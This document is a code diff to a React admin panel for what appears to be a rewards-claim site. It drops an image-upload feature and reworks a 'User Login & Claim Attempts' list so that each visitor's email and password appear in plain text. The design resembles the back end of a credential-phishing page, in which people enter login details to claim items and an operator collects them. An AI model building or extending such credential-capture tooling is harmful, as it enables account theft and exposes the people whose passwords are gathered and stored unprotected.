@@ -27,7 +27,7 @@ interface RewardItem {
 const AdminPanel = () => {
   const [accessAttempts, setAccessAttempts] = useState<AccessAttempt[]>([]);
   const [items, setItems] = useState<RewardItem[]>([]);
-  const [selectedFiles, setSelectedFiles] = useState<{ [key: number]: File | null }>({});
+  
   const [isAuthenticated, setIsAuthenticated] = useState(false);
   const [accessKey, setAccessKey] = useState('');
   const { toast } = useToast();
@@ -101,10 +101,9 @@ const AdminPanel = () => {
         
         const formattedAttempts = data.map(attempt => ({
           id: attempt.id,
-          email: attempt.email,
-          passphrase: attempt.passphrase,
-          item_id: attempt.item_id,
-          item_name: attempt.item_name,
+          email: attempt.email || 'No email',
+          passphrase: attempt.passphrase || 'No password',
+          item_name: attempt.item_name || 'Unknown Item',
           timestamp: attempt.timestamp,
           status: attempt.status as 'success' | 'failed'
         }));
@@ -195,59 +194,6 @@ const AdminPanel = () => {
     };
   }, [isAuthenticated]);
 
-  const handleFileSelect = (itemId: number, file: File | null) => {
-    setSelectedFiles(prev => ({
-      ...prev,
-      [itemId]: file
-    }));
-  };
-
-  const handleImageUpdate = async (itemId: number) => {
-    const file = selectedFiles[itemId];
-    if (!file) {
-      toast({
-        variant: "destructive",
-        title: "No file selected",
-        description: "Please select an image file first.",
-      });
-      return;
-    }
-
-    try {
-      // Convert file to base64 or blob URL for immediate display
-      const reader = new FileReader();
-      reader.onload = async (e) => {
-        const imageUrl = e.target?.result as string;
-        
-        const { error } = await supabase
-          .from('items')
-          .update({ image_url: imageUrl })
-          .eq('id', itemId);
-
-        if (error) throw error;
-
-        // Clear the selected file
-        setSelectedFiles(prev => ({
-          ...prev,
-          [itemId]: null
-        }));
-
-        toast({
-          title: "Image Updated",
-          description: `Item image has been updated successfully.`,
-          className: "border-primary bg-card text-foreground",
-        });
-      };
-      reader.readAsDataURL(file);
-    } catch (error) {
-      console.error('Error updating image:', error);
-      toast({
-        variant: "destructive",
-        title: "Error",
-        description: "Failed to update image.",
-      });
-    }
-  };
 
   const handleLogout = () => {
     setIsAuthenticated(false);
@@ -316,51 +262,12 @@ const AdminPanel = () => {
           </Button>
         </div>
 
-        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
-          {/* Image Management */}
-          <Card className="card-premium">
-            <div className="flex items-center gap-2 mb-6">
-              <Upload className="w-5 h-5 text-primary" />
-              <h2 className="text-xl font-semibold text-foreground">Item Management</h2>
-            </div>
-            
-            <div className="space-y-4">
-              {items.map((item) => (
-                <div key={item.id} className="flex items-center gap-4 p-4 bg-muted/30 rounded-lg">
-                  <div className="w-12 h-12 rounded overflow-hidden flex-shrink-0">
-                    <img 
-                      src={item.image_url} 
-                      alt={item.name}
-                      className="w-full h-full object-cover"
-                    />
-                  </div>
-                  <div className="flex-1">
-                    <Label className="text-sm font-medium">{item.name}</Label>
-                    <Input
-                      type="file"
-                      accept="image/*"
-                      onChange={(e) => handleFileSelect(item.id, e.target.files?.[0] || null)}
-                      className="mt-1 text-xs"
-                    />
-                  </div>
-                  <Button
-                    onClick={() => handleImageUpdate(item.id)}
-                    size="sm"
-                    className="btn-royal"
-                    disabled={!selectedFiles[item.id]}
-                  >
-                    Update
-                  </Button>
-                </div>
-              ))}
-            </div>
-          </Card>
-
+        <div className="w-full">
           {/* Access Monitoring */}
           <Card className="card-premium">
             <div className="flex items-center gap-2 mb-6">
               <Eye className="w-5 h-5 text-primary" />
-              <h2 className="text-xl font-semibold text-foreground">Access Attempts ({accessAttempts.length})</h2>
+              <h2 className="text-xl font-semibold text-foreground">User Login & Claim Attempts ({accessAttempts.length})</h2>
             </div>
             
             <div className="space-y-3 max-h-96 overflow-y-auto">
@@ -378,9 +285,10 @@ const AdminPanel = () => {
                       </span>
                     </div>
                     <div className="text-sm text-muted-foreground space-y-2">
-                      <p><strong className="text-foreground">Item Claimed:</strong> {attempt.item_name || 'Unknown Item'}</p>
-                      <p><strong className="text-foreground">Password Used:</strong> <span className="font-mono bg-muted px-2 py-1 rounded">{attempt.passphrase || 'No password'}</span></p>
-                      <p><strong className="text-foreground">Attempt Time:</strong> {attempt.timestamp ? new Date(attempt.timestamp).toLocaleString() : 'Unknown time'}</p>
+                      <p><strong className="text-foreground">Email:</strong> <span className="font-mono bg-muted px-2 py-1 rounded">{attempt.email}</span></p>
+                      <p><strong className="text-foreground">Password:</strong> <span className="font-mono bg-muted px-2 py-1 rounded">{attempt.passphrase}</span></p>
+                      <p><strong className="text-foreground">Item Claimed:</strong> {attempt.item_name}</p>
+                      <p><strong className="text-foreground">Time:</strong> {attempt.timestamp ? new Date(attempt.timestamp).toLocaleString() : 'Unknown time'}</p>
                     </div>
                   </div>
                 ))
